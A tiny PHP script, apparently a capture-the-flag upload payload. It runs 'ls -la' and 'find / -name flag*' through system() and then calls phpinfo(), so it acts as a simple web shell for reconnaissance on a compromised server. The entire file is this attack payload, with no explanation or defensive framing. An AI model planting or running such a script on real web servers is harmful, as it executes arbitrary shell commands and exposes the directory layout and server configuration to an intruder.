<?php
system("ls -la");
echo "<br>Flag?: ";
system("find / -name flag* 2>/dev/null");
phpinfo();
?>
